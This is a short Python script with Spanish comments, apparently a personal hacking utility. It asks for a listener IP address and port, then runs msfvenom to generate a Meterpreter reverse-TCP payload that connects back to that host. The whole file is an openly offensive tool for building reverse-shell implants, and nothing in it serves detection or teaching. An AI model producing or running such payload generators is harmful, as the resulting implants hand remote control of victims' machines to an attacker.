#!/bin/python3

import os
import subprocess

# Colores para la terminal
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"

def print_banner():
    """Muestra un banner atractivo."""
    print(f"""
{CYAN}{BOLD}--------------------------------------------
|           MSFVENOM PAYLOAD MAKER           |
--------------------------------------------{RESET}
""")

def get_input(prompt, validation=None):
    """
    Solicita entrada del usuario con un mensaje personalizado.
    Aplica validación si se proporciona.
    """
    while True:
        user_input = input(f"{YELLOW}{prompt}: {RESET}")
        if validation and not validation(user_input):
            print(f"{RED}Entrada inválida. Inténtalo de nuevo.{RESET}")
        else:
            return user_input

def validate_ip(ip):
    """Valida una dirección IP."""
    parts = ip.split(".")
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def validate_port(port):
    """Valida un puerto."""
    return port.isdigit() and 1 <= int(port) <= 65535

def generate_payload(ip, port):
    """Genera el payload con msfvenom."""
    try:
        command = f"msfvenom -p python/meterpreter/reverse_tcp LHOST={ip} LPORT={port}"
        print(f"\n{CYAN}{BOLD}Ejecutando el siguiente comando:{RESET}\n{GREEN}{command}{RESET}")
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{RED}Error al ejecutar msfvenom: {e}{RESET}")

def main():
    """Función principal del script."""
    print_banner()

    # Solicitar IP y puerto al usuario
    ip = get_input("Por favor, ingresa la dirección IP (LHOST)", validate_ip)
    port = get_input("Por favor, ingresa el puerto (LPORT)", validate_port)

    # Generar el payload
    generate_payload(ip, port)

if __name__ == "__main__":
    main()
